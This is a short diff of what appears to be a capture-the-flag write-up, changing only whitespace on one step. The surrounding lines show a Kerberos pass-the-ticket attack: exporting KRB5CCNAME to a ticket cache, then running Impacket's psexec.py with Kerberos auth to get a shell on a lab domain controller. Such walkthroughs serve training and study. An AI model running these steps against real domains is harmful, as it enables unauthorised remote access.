@@ -74,7 +74,7 @@ What this tool does is:
 	`export KRB5CCNAME=<.ccache_file_containing_TGT>`
 <img width="663" height="65" alt="Screenshot 2026-09-01 032600" src="https://github.com/user-attachments/assets/211814ed-f67d-4644-8c06-ac5442517df7" />
 
-3. Use PsExec to get a shell and obtain the flag
+3. Use PsExec to get a shell and obtain the flag  
 	`impacket/psexec.py ctf.local/j.smith@DC01.CTF.LOCAL -k -no-pass`
 <img width="801" height="552" alt="Pasted image 20260901033654" src="https://github.com/user-attachments/assets/fe89649a-091b-4250-b791-8b6ac7fc4b76" />
 
